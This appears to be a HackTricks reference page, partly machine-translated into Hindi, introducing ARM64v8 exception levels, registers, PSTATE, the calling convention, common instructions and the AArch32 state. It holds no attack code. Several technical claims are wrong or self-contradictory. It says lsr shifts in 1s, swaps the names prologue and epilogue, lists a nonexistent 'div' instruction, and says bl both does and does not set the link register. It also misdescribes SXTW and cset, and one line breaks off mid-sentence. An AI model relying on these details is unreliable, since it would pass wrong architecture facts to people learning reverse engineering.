# ARM64v8 परिचय

{{#include ../../../banners/hacktricks-training.md}}


## **अपवाद स्तर - EL (ARM64v8)**

ARMv8 आर्किटेक्चर में, execution स्तर जिन्हें Exception Levels (ELs) कहा जाता है, execution वातावरण के privilege स्तर और क्षमताओं को परिभाषित करते हैं। चार exception स्तर होते हैं, EL0 से EL3 तक, हर एक अलग उद्देश्य सेवा देता है:

1. **EL0 - User Mode**:
- यह सबसे कम-privileged स्तर है और सामान्य application कोड को चलाने के लिए उपयोग होता है।
- EL0 पर चलने वाली एप्लिकेशन एक दूसरे और सिस्टम सॉफ़्टवेयर से अलग-थलग रहती हैं, जिससे सुरक्षा और स्थिरता बढ़ती है।
2. **EL1 - Operating System Kernel Mode**:
- अधिकांश ऑपरेटिंग सिस्टम kernels इस स्तर पर चलते हैं।
- EL1 में EL0 की तुलना में अधिक privileges होते हैं और यह system resources तक पहुँच सकता है, लेकिन सिस्टम अखंडता सुनिश्चित करने के लिए कुछ प्रतिबंध होते हैं। You go from EL0 to EL1 with the SVC instruction.
3. **EL2 - Hypervisor Mode**:
- यह स्तर virtualization के लिए उपयोग होता है। EL2 पर चलने वाला hypervisor एक ही भौतिक हार्डवेयर पर कई ऑपरेटिंग सिस्टम्स (प्रत्येक अपने EL1 में) का प्रबंधन कर सकता है।
- EL2 isolation और virtualized environments के नियंत्रण के लिए सुविधाएँ प्रदान करता है।
- So virtual machine applications like Parallels can use the `hypervisor.framework` to interact with EL2 and run virtual machines without needing kernel extensions.
- TO move from EL1 to EL2 the `HVC` instruction is used.
4. **EL3 - Secure Monitor Mode**:
- यह सबसे अधिक privileged स्तर है और अक्सर secure booting और trusted execution environments के लिए उपयोग होता है।
- EL3 secure और non-secure राज्यों के बीच पहुंचों का प्रबंधन और नियंत्रण कर सकता है (जैसे secure boot, trusted OS, आदि)।
- It was use for KPP (Kernel Patch Protection) in macOS, but it's not used anymore.
- EL3 is not used anymore by Apple.
- The transition to EL3 is typically done using the `SMC` (Secure Monitor Call) instruction.

इन स्तरों का उपयोग सिस्टम के अलग-अलग पहलुओं (user applications से लेकर सबसे privileged सिस्टम सॉफ़्टवेयर तक) को संरचित और सुरक्षित तरीके से प्रबंधित करने की अनुमति देता है। ARMv8 का privilege स्तरों के प्रति दृष्टिकोण विभिन्न सिस्टम घटकों को प्रभावी ढंग से अलग करने में मदद करता है, जिससे सिस्टम की सुरक्षा और मजबूती बढ़ती है।

## **Registers (ARM64v8)**

ARM64 में **31 general-purpose registers** होते हैं, जिनके नाम `x0` से `x30` तक होते हैं। प्रत्येक में **64-bit** (8-byte) मान संग्रहीत किया जा सकता है। जिन ऑपरेशनों के लिए केवल 32-bit मानों की आवश्यकता होती है, वे वही registers 32-bit मोड में `w0` से `w30` नामों का उपयोग करके एक्सेस किए जा सकते हैं।

1. **`x0`** to **`x7`** - ये सामान्यतः scratch registers और subroutines को parameters पास करने के लिए उपयोग होते हैं।
- **`x0`** फ़ंक्शन का return data भी वहन करता है
2. **`x8`** - Linux kernel में, `x8` का उपयोग `svc` instruction के लिए system call number के रूप में किया जाता है। **In macOS the x16 is the one used!**
3. **`x9`** to **`x15`** - अधिक temporary registers, जो अक्सर local variables के लिए उपयोग होते हैं।
4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**। तत्काल मानों के लिए temporary registers। ये indirect function calls और PLT (Procedure Linkage Table) stubs के लिए भी उपयोग होते हैं।
- **`x16`** को **`svc`** instruction में **system call number** के रूप में **macOS** में उपयोग किया जाता है।
5. **`x18`** - **Platform register**। इसे general-purpose register के रूप में उपयोग किया जा सकता है, पर कुछ प्लेटफॉर्म्स पर यह platform-specific उपयोगों के लिए सुरक्षित रखा जाता है: Windows में current thread environment block का pointer, या linux kernel में वर्तमान **executing task structure** को पॉइंट करने के लिए।
6. **`x19`** to **`x28`** - ये callee-saved registers हैं। एक फ़ंक्शन को इन registers के मान अपने caller के लिए संरक्षित रखने होते हैं, इसलिए इन्हें स्टैक में संग्रहीत किया जाता है और caller को लौटने से पहले पुनः प्राप्त किया जाता है।
7. **`x29`** - **Frame pointer** जो stack frame का ट्रैक रखने के लिए। जब एक नया stack frame बनता है क्योंकि कोई फ़ंक्शन कॉल होता है, तो **`x29`** register को **stack में संग्रहीत** किया जाता है और नया frame pointer पता (**`sp`** address) इस register में **संग्रहीत** किया जाता है।
- यह register एक **general-purpose register** के रूप में भी उपयोग किया जा सकता है हालाँकि इसे आमतौर पर **local variables** के संदर्भ के रूप में उपयोग किया जाता है।
8. **`x30`** or **`lr`**- **Link register**। यह `BL` (Branch with Link) या `BLR` (Branch with Link to Register) निर्देश के निष्पादन पर **return address** रखता है, इस register में **`pc`** मान संग्रहीत करके।
- इसे किसी अन्य register की तरह भी उपयोग किया जा सकता है।
- अगर वर्तमान फ़ंक्शन नया फ़ंक्शन कॉल करने जा रहा है और इसलिए `lr` ओवरराइट होगा, तो यह शुरुआत में इसे stack में संग्रहीत करेगा, यह epilogue है (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) और अंत में इसे पुनर्प्राप्त करेगा, यह prologue है (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, जो stack के शीर्ष का ट्रैक रखने के लिए उपयोग होता है।
- **`sp`** मान को कम से कम एक **quadword alignment** पर रखा जाना चाहिए अन्यथा alignment exception हो सकती है।
10. **`pc`** - **Program counter**, जो अगले instruction की ओर संकेत करता है। इस register को केवल exception generation, exception returns, और branches के माध्यम से अपडेट किया जा सकता है। सामान्य निर्देशों में से केवल branch with link निर्देश (BL, BLR) ही इस register को पढ़ सकते हैं ताकि **`pc`** पता **`lr`** (Link Register) में संग्रहीत किया जा सके।
11. **`xzr`** - **Zero register**। 32-बिट रूप में इसे **`wzr`** कहा जाता है। इसे zero मान आसानी से प्राप्त करने के लिए (सामान्य ऑपरेशन) या `subs` जैसी तुलना करने के लिए उपयोग किया जा सकता है, जैसे **`subs XZR, Xn, #10`**, जो परिणाम को कहीं भी संग्रहीत नहीं करता (in **`xzr`**)।

**`Wn`** registers, **`Xn`** register का **32bit** संस्करण हैं।

> [!TIP]
> `X0` - `X18` तक के registers volatile हैं, जिसका अर्थ है कि उनके मान function calls और interrupts द्वारा बदल सकते हैं। हालाँकि, `X19` - `X28` तक के registers non-volatile हैं, यानी उनके मान function calls के दौरान संरक्षित रखने चाहिए ("callee saved")।

### SIMD and Floating-Point Registers

इसके अलावा, और भी **32 registers of 128bit length** होते हैं जिनका उपयोग optimized single instruction multiple data (SIMD) ऑपरेशनों और floating-point अंकगणित के लिए किया जाता है। इन्हें Vn registers कहा जाता है हालाँकि ये **64**-bit, **32**-bit, **16**-bit और **8**-bit मोड में भी कार्य कर सकते हैं और तब इन्हें **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** और **`Bn`** कहा जाता है।

### System Registers

**सैकड़ों system registers** हैं, जिन्हें special-purpose registers (SPRs) भी कहा जाता है, जो processors के व्यवहार की **monitoring** और **controlling** के लिए उपयोग होते हैं.\
इन्हें केवल समर्पित विशेष निर्देश **`mrs`** और **`msr`** का उपयोग करके पढ़ा या सेट किया जा सकता है।

विशेष registers **`TPIDR_EL0`** और **`TPIDDR_EL0`** अक्सर reversing engineering में मिलते हैं। `EL0` उपसर्ग उस न्यूनतम exception को संकेत करता है जिससे register को एक्सेस किया जा सकता है (इस मामले में EL0 वह नियमित exception (privilege) स्तर है जिस पर सामान्य प्रोग्राम चलते हैं)।\
इन्हें अक्सर **thread-local storage** क्षेत्र के base address को स्टोर करने के लिए उपयोग किया जाता है। आमतौर पर पहला readable और writable होता है EL0 पर चलने वाले प्रोग्राम्स के लिए, पर दूसरा EL0 से पढ़ा जा सकता है और EL1 (kernel) से लिखा जा सकता है।

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** में कई process घटक होते हैं जिन्हें operating-system-visible **`SPSR_ELx`** विशेष register में सीरियलाइज़ किया जाता है, जहां X उस triggered exception का **permission** **level** है (यह exception समाप्त होने पर process state को पुनर्प्राप्त करने की अनुमति देता है)।\
ये पहुँच योग्य फ़ील्ड्स हैं:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Condition flags **`N`**, **`Z`**, **`C`** और **`V`**:
- **`N`** का मतलब है ऑपरेशन का परिणाम नकारात्मक आया
- **`Z`** का मतलब है ऑपरेशन का परिणाम शून्य आया
- **`C`** का मतलब है ऑपरेशन ने carry किया
- **`V`** का मतलब है ऑपरेशन ने signed overflow दिया:
- दो सकारात्मक संख्याओं का योग नकारात्मक परिणाम देता है।
- दो नकारात्मक संख्याओं का योग सकारात्मक परिणाम देता है।
- घटाव में, जब एक बड़ी नकारात्मक संख्या को एक छोटी सकारात्मक संख्या से घटाया जाता है (या इसके विपरीत), और परिणाम दिए गए बिट आकार की सीमा में प्रदर्शित नहीं हो पाता।
- स्पष्ट है कि processor को यह जानकारी नहीं होती कि ऑपरेशन signed है या नहीं, इसलिए यह operations में C और V को जांचेगा और संकेत देगा कि carry हुआ या नहीं, चाहे वह signed या unsigned हो।

> [!WARNING]
> सभी निर्देश इन flags को अपडेट नहीं करते। कुछ जैसे **`CMP`** या **`TST`** करते हैं, और अन्य जो `s` suffix वाले हैं जैसे **`ADDS`** भी इसे अपडेट करते हैं।

- वर्तमान **register width (`nRW`) flag**: यदि flag का मान 0 है, तो प्रोग्राम resumed होने पर AArch64 execution state में चलेगा।
- वर्तमान **Exception Level** (**`EL`**): EL0 में चलने वाला एक सामान्य प्रोग्राम इसका मान 0 होगा
- **single stepping** flag (**`SS`**): Debuggers द्वारा single step करने के लिए उपयोग किया जाता है; SS flag को 1 सेट करके **`SPSR_ELx`** के भीतर exception के माध्यम से सेट किया जाता है। प्रोग्राम एक स्टेप रन करेगा और single step exception जारी करेगा।
- **illegal exception** state flag (**`IL`**): यह उस स्थिति को चिह्नित करने के लिए उपयोग होता है जब privileged सॉफ़्टवेयर एक invalid exception level transfer करता है, यह flag 1 पर सेट हो जाता है और processor एक illegal state exception ट्रिगर करता है।
- **`DAIF`** flags: ये flags privileged प्रोग्राम को कुछ external exceptions को selective रूप से mask करने की अनुमति देते हैं।
- यदि **`A`** 1 है तो इसका मतलब है **asynchronous aborts** ट्रिगर होंगे। **`I`** external hardware **Interrupts Requests** (IRQs) का उत्तर देने को कॉन्फ़िगर करता है। और F **Fast Interrupt Requests** (FIRs) से संबंधित है।
- **stack pointer select** flags (**`SPS`**): EL1 और उससे ऊपर चलने वाले privileged प्रोग्राम अपने स्वयं के stack pointer register और user-model वाले के बीच स्वैप कर सकते हैं (उदा. `SP_EL1` और `EL0` के बीच)। यह switching **`SPSel`** विशेष register में लिखकर किया जाता है। यह EL0 से नहीं किया जा सकता।

## **Calling Convention (ARM64v8)**

ARM64 calling convention निर्दिष्ट करता है कि फ़ंक्शन के पहले आठ parameters registers **`x0` से `x7`** में पास किए जाते हैं। अतिरिक्त parameters **stack** पर पास किए जाते हैं। return value register **`x0`** में वापस की जाती है, या यदि यह 128 बिट लंबी है तो **`x1`** में भी दी जा सकती है। **`x19`** से **`x30`** और **`sp`** registers को function calls के दौरान **preserve** करना आवश्यक है।

Assembly में किसी फ़ंक्शन को पढ़ते समय, फ़ंक्शन prologue और epilogue की तलाश करें। **prologue** आमतौर पर frame pointer (`x29`) को सुरक्षित करना, नया frame pointer सेट करना, और stack स्थान आवंटित करने को शामिल करता है। **epilogue** आमतौर पर सहेजे हुए frame pointer को पुनर्स्थापित करना और फ़ंक्शन से return करना शामिल करता है।

### Calling Convention in Swift

Swift का अपना **calling convention** है जिसे आप यहां पा सकते हैं: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 निर्देश सामान्यतः फ़ॉर्मेट `opcode dst, src1, src2` में होते हैं, जहाँ **`opcode`** वह ऑपरेशन है जो किया जाएगा (जैसे `add`, `sub`, `mov`, आदि), **`dst`** वह destination register है जहाँ परिणाम संग्रहीत होगा, और **`src1`** और **`src2`** source registers हैं। Immediate मान भी source registers के स्थान पर उपयोग किए जा सकते हैं।

- **`mov`**: एक मान को एक **register** से दूसरे में **move** करता है।
- Example: `mov x0, x1` — यह `x1` से मान को `x0` में स्थानांतरित करता है।
- **`ldr`**: मेमोरी से एक मान को **load** करके **register** में लाता है।
- Example: `ldr x0, [x1]` — यह `x1` द्वारा संकेतित memory स्थान से मान लोड करके `x0` में रखता है।
- **Offset mode**: origin pointer पर प्रभाव डालने वाला एक offset दर्शाया जाता है, उदाहरण के लिए:
- `ldr x2, [x1, #8]`, यह `x1 + 8` से x2 में मान लोड करेगा
- `ldr x2, [x0, x1, lsl #2]`, यह x2 में array x0 से ऑब्जेक्ट लोड करेगा, स्थिति x1 (index) * 4 से
- **Pre-indexed mode**: यह origin पर गणना लागू करेगा, परिणाम प्राप्त करेगा और नया origin भी origin में स्टोर करेगा।
- `ldr x2, [x1, #8]!`, यह `x1 + 8` को `x2` में लोड करेगा और x1 में `x1 + 8` का परिणाम स्टोर करेगा
- `str lr, [sp, #-4]!`, link register को sp में स्टोर करें और sp को अपडेट करें
- **Post-index mode**: यह पिछले वाला जैसा है पर memory address पहले एक्सेस किया जाता है और फिर offset की गणना की जाती है और स्टोर की जाती है।
- `ldr x0, [x1], #8`, `x1` को `x0` में लोड करें और x1 को `x1 + 8` से अपडेट करें
- **PC-relative addressing**: इस मामले में load करने वाला पता PC register के सापेक्ष गणना किया जाता है
- `ldr x1, =_start`, यह `_start` symbol जहां शुरू होता है उस पते को वर्तमान PC से संबंधित रूप में x1 में लोड करेगा।
- **`str`**: एक मान को **register** से **memory** में **store** करता है।
- Example: `str x0, [x1]` — यह `x0` का मान `x1` द्वारा संकेतित memory स्थान में संग्रहीत करता है।
- **`ldp`**: **Load Pair of Registers**। यह निर्देश लगातार memory स्थानों से दो registers लोड करता है। memory पता सामान्यतः किसी अन्य register के मान में एक offset जोड़कर बनाया जाता है।
- Example: `ldp x0, x1, [x2]` — यह `x0` और `x1` को memory स्थानों `x2` और `x2 + 8` से क्रमशः लोड करता है।
- **`stp`**: **Store Pair of Registers**। यह निर्देश लगातार memory स्थानों पर दो registers को store करता है। memory पता सामान्यतः किसी अन्य register के मान में एक offset जोड़कर बनाया जाता है।
- Example: `stp x0, x1, [sp]` — यह `x0` और `x1` को memory स्थानों `sp` और `sp + 8` पर स्टोर करता है।
- `stp x0, x1, [sp, #16]!` — यह `x0` और `x1` को memory स्थानों `sp+16` और `sp + 24` पर स्टोर करता है, और `sp` को `sp+16` से अपडेट करता है।
- **`add`**: दो registers के मान जोड़कर परिणाम को एक register में संग्रहीत करता है।
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register or immediate)
- \[shift #N | RRX] -> Perform a shift or call RRX
- Example: `add x0, x1, x2` — यह `x1` और `x2` के मान जोड़कर परिणाम `x0` में संग्रहीत करेगा।
- `add x5, x5, #1, lsl #12` — यह 4096 के बराबर है (1 को 12 बार शिफ्ट किया गया) -> 1 0000 0000 0000 0000
- **`adds`** यह `add` करता है और flags को अपडेट करता है
- **`sub`**: दो registers के मान घटाकर परिणाम को एक register में संग्रहीत करता है।
- Check **`add`** **syntax**.
- Example: `sub x0, x1, x2` — यह `x2` के मान को `x1` से घटाकर परिणाम `x0` में संग्रहीत करता है।
- **`subs`** यह `sub` जैसा है पर flags को अपडेट करता है
- **`mul`**: दो registers के मानों का गुणा करके परिणाम एक register में संग्रहीत करता है।
- Example: `mul x0, x1, x2` — यह `x1` और `x2` के मानों का गुणा करके परिणाम को `x0` में रखता है।
- **`div`**: एक register के मान को दूसरे से विभाजित करके परिणाम एक register में संग्रहीत करता है।
- Example: `div x0, x1, x2` — यह `x1` को `x2` से विभाजित करके परिणाम `x0` में रखता है।
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: अन्य बिट्स को आगे धकेलते हुए अंत से 0 जोड़ता है (n-गुना 2 से गुणा)
- **Logical shift right**: शुरुआत में 1s जोड़कर अन्य बिट्स को पीछे करता है (unsigned में n-गुना 2 से विभाजन)
- **Arithmetic shift right**: **`lsr`** जैसा है, पर यदि most significant bit 1 है तो 0s के बजाय 1s जोड़े जाते हैं (signed में n-गुना 2 से विभाजन)
- **Rotate right**: **`lsr`** जैसा है पर जो भी दाईं ओर से हटाया जाता है वह बाईं ओर जोड़ दिया जाता है
- **Rotate Right with Extend**: **`ror`** जैसा है लेकिन carry flag को "most significant bit" के रूप में उपयोग करता है। इसलिए carry flag बिट 31 में चला जाता है और हटाया गया बिट carry flag में चला जाता है।
- **`bfm`**: **Bit Filed Move**, ये operations किसी मान के बिट्स `0...n` को कॉपी करके उन्हें स्थितियों **`m..m+n`** में रखते हैं। **`#s`** leftmost bit स्थिति और **`#r`** rotate right राशि को निर्दिष्ट करता है।
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** एक register से bitfield कॉपी करें और इसे दूसरे register में कॉपी करें।
- **`BFI X1, X2, #3, #4`** X2 से 4 बिट्स को X1 के 3rd बिट से insert करें
- **`BFXIL X1, X2, #3, #4`** X2 के 3rd बिट से चार बिट्स निकालकर X1 में कॉपी करें
- **`SBFIZ X1, X2, #3, #4`** X2 से 4 बिट्स को साइन-extend करके X1 में बिट पोजिशन 3 से insert करें और दाईं ओर के बिट्स को शून्य करें
- **`SBFX X1, X2, #3, #4`** X2 के बिट 3 से शुरू होकर 4 बिट्स निकालता है, उन्हें sign-extend करता है, और परिणाम X1 में रखता है
- **`UBFIZ X1, X2, #3, #4`** X2 से 4 बिट्स को zero-extend करके X1 में बिट पोजिशन 3 से insert करता है और दाईं ओर के बिट्स को शून्य करता है
- **`UBFX X1, X2, #3, #4`** X2 के बिट 3 से शुरू होकर 4 बिट्स निकालता है और zero-extended परिणाम को X1 में रखता है।
- **Sign Extend To X:** किसी मान के sign को बढ़ाता है (या unsigned संस्करण में केवल 0s जोड़ता है) ताकि उसके साथ ऑपरेशन किए जा सकें:
- **`SXTB X1, W2`** W2 से एक बाइट का sign extend करके X1 में भरता है (`W2` `X2` का आधा है) ताकि 64bits भर जाएं
- **`SXTH X1, W2`** 16bit संख्या के sign को W2 से X1 में बढ़ाकर 64bits भरता है
- **`SXTW X1, W2`** W2 से एक बाइट का sign extend करके X1 में भरता है ताकि 64bits भर जाएं
- **`UXTB X1, W2`** unsigned में 0s जोड़ता है W2 से X1 में बाइट को भरने के लिए ताकि 64bits भर जाएं
- **`extr`:** निर्दिष्ट जोड़ी registers के concatenated मान से bits निकालता है।
- Example: `EXTR W3, W2, W1, #3` यह W1+W2 को concat करेगा और W2 के bit 3 से लेकर W1 के bit 3 तक प्राप्त करेगा और इसे W3 में संग्रहीत करेगा।
- **`cmp`**: दो registers की तुलना करता है और condition flags सेट करता है। यह `subs` का alias है जो destination register को zero register में सेट करता है। उपयोगी यह जानने के लिए कि `m == n`।
- यह `subs` जैसी ही syntax सपोर्ट करता है
- Example: `cmp x0, x1` — यह `x0` और `x1` के मानों की तुलना करता है और condition flags को उपयुक्त रूप से सेट करता है।
- **`cmn`**: negative operand की तुलना। यह `adds` का alias है और वही syntax सपोर्ट करता है। उपयोगी यह जानने के लिए कि `m == -n`।
- **`ccmp`**: Conditional comparison, यह एक तुलना है जो केवल तभी की जाएगी जब पिछली तुलना true थी और यह विशेष रूप से nzcv bits सेट करेगी।
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> अगर x1 != x2 और x3 < x4, तो func पर जाएँ
- इसका कारण यह है कि **`ccmp`** केवल तभी निष्पादित होगा जब पिछला `cmp` एक `NE` था, यदि यह नहीं था तो bits `nzcv` को 0 पर सेट किया जाएगा (जो `blt` तुलना को संतुष्ट नहीं करेगा)।
- यह `ccmn` के रूप में भी उपयोग किया जा सकता है (उसी तरह पर negative के साथ, जैसे `cmp` बनाम `cmn`)।
- **`tst`**: यह जांचता है कि तुलना में किसी भी मान के दिए गए बिट्स दोनों 1 हैं या नहीं (यह ANDS जैसा काम करता है बिना परिणाम कहीं संग्रहीत किए)। यह किसी register के कुछ बिट्स की जाँच करने के लिए उपयोगी है।
- Example: `tst X1, #7` जांचता है कि X1 के अंतिम 3 बिट्स में से कोई 1 है या नहीं
- **`teq`**: परिणाम को डिस्कार्ड करते हुए XOR ऑपरेशन
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- ध्यान दें कि इससे link register return address के साथ भरता नहीं है (subroutine calls के लिए जो वापसी चाहिए, उपयुक्त नहीं)
- **`bl`**: **Branch** with link, subroutine कॉल करने के लिए उपयोग होता है। यह **return address को `x30` में स्टोर** करता है।
- Example: `bl myFunction` — यह फ़ंक्शन `myFunction` को कॉल करता है और return address को `x30` में स्टोर करता है।
- Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
- **`blr`**: **Branch** with Link to Register, subroutine कॉल करने के लिए उपयोग होता है जहाँ लक्ष्य एक register में निर्दिष्ट होता है। यह return address को `x30` में स्टोर करता है। (This is
- Example: `blr x1` — यह उस फ़ंक्शन को कॉल करता है जिसका पता `x1` में है और return address को `x30` में स्टोर करता है।
- **`ret`**: subroutine से **Return**, सामान्यतः `x30` में पते का उपयोग करके।
- Example: `ret` — यह वर्तमान subroutine से `x30` में रखे return address का उपयोग करके लौटता है।
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, पिछले `cmp` निर्देश के आधार पर।
- Example: `b.eq label` — यदि पिछले `cmp` निर्देश ने दो समान मान पाए, तो यह `label` पर कूदता है।
- **`b.ne`**: **Branch if Not Equal**। यह instruction condition flags की जांच करता है (जो किसी पिछली comparison instruction द्वारा सेट किए गए थे), और यदि तुलना किए गए मान समान नहीं थे, तो यह किसी label या पते पर branch करता है।
- Example: `cmp x0, x1` के बाद, `b.ne label` — यदि `x0` और `x1` के मान समान नहीं थे, तो यह `label` पर कूदता है।
- **`cbz`**: **Compare and Branch on Zero**। यह instruction एक register की तुलना शून्य से करता है, और यदि वे समान हैं तो यह किसी label या पते पर branch करता है।
- Example: `cbz x0, label` — यदि `x0` का मान शून्य है, तो यह `label` पर कूदता है।
- **`cbnz`**: **Compare and Branch on Non-Zero**। यह instruction एक register की तुलना शून्य से करता है, और यदि वे असमान हैं तो यह किसी label या पते पर branch करता है।
- Example: `cbnz x0, label` — यदि `x0` का मान शून्य नहीं है, तो यह `label` पर कूदता है।
- **`tbnz`**: Test bit and branch on nonzero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Example: `tbz x0, #8, label`
- **Conditional select operations**: ये वे ऑपरेशंस हैं जिनका व्यवहार conditional bits के आधार पर बदलता है।
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> If true, X0 = X1, if false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> If true, Xd = Xn + 1, if false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> If true, Xd = NOT(Xn), if false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = - Xm
- `cneg Xd, Xn, cond` -> If true, Xd = - Xn, if false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> If true, Xd = 1, if false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> If true, Xd = \<all 1>, if false, Xd = 0
- **`adrp`**: किसी symbol का **page address** गणना करता है और इसे register में संग्रहीत करता है।
- Example: `adrp x0, symbol` — यह `symbol` का page address गणना करके `x0` में स्टोर करता है।
- **`ldrsw`**: मेमोरी से एक signed **32-bit** मान लोड करता है और उसे **64** बिट में sign-extend करता है। यह सामान्य SWITCH मामलों के लिए उपयोग होता है।
- Example: `ldrsw x0, [x1]` — यह `x1` द्वारा संकेतित memory स्थान से एक signed 32-bit मान लोड करके उसे 64 बिट में sign-extend कर `x0` में रखता है।
- **`stur`**: किसी register के मान को memory स्थान पर store करता है, दूसरे register से offset का उपयोग करते हुए।
- Example: `stur x0, [x1, #4]` — यह `x0` के मान को उस memory पते पर स्टोर करता है जो वर्तमान में `x1` के पते से 4 बाइट अधिक है।
- **`svc`** : System call बनाना। यह "Supervisor Call" के लिए है। जब processor इस instruction को निष्पादित करता है, तो यह **user mode से kernel mode** में स्विच करता है और उस विशेष memory स्थान पर कूदता है जहाँ **kernel's system call handling** कोड स्थित होता है।

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **नए फ्रेम पॉइंटर को सेट करें**: `mov x29, sp` (वर्तमान फ़ंक्शन के लिए नया फ्रेम पॉइंटर सेट करता है)
3. **लोकल वेरिएबल्स के लिए स्टैक पर जगह आवंटित करें** (यदि आवश्यक): `sub sp, sp, <size>` (जहाँ `<size>` आवश्यक बाइट्स की संख्या है)

### **फ़ंक्शन समापन**

1. **लोकल वेरिएबल्स को डी-अलोकेट करें (यदि कोई आवंटित किए गए थे)**: `add sp, sp, <size>`
2. **लिंक रजिस्टर और फ्रेम पॉइंटर को पुनर्स्थापित करें**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **रिटर्न**: `ret` (लिंक रजिस्टर में मौजूद पते का उपयोग करके कॉलर को नियंत्रण लौटाता है)

## ARM सामान्य मेमोरी सुरक्षा

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 निष्पादन स्थिति

Armv8-A 32-bit प्रोग्रामों के निष्पादन का समर्थन करता है। **AArch32** दो **निर्देश सेट्स** में से किसी एक में चल सकता है: **`A32`** और **`T32`** और इनके बीच **`interworking`** के माध्यम से स्विच कर सकता है।\
**विशेषाधिकार प्राप्त** 64-bit प्रोग्राम्स 32-bit प्रोग्रामों के निष्पादन को निम्न विशेषाधिकार वाले 32-bit पर exception level transfer करके शेड्यूल कर सकते हैं।\
ध्यान दें कि 64-bit से 32-bit में ट्रांज़िशन एक कम exception level पर होता है (उदा., EL1 में चल रहा 64-bit प्रोग्राम EL0 में प्रोग्राम को ट्रिगर कर सकता है)। यह तब किया जाता है जब `AArch32` प्रोसेस थ्रेड निष्पादित होने के लिए तैयार होता है, तब विशेष रजिस्टर **`SPSR_ELx`** का **bit 4** को **1** सेट किया जाता है और `SPSR_ELx` का शेष भाग `AArch32` प्रोग्राम का CPSR स्टोर करता है। फिर, विशेषाधिकार प्राप्त प्रोसेस **`ERET`** निर्देश कॉल करता है ताकि प्रोसेसर **`AArch32`** में ट्रांज़िशन करे और CPSR के अनुसार A32 या T32 में प्रवेश करे।

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
यह **interworking branch instructions** के दौरान सेट किया जाता है, लेकिन अन्य निर्देशों के साथ भी सीधे सेट किया जा सकता है जब PC को destination register के रूप में सेट किया जाता है। उदाहरण:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
- **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

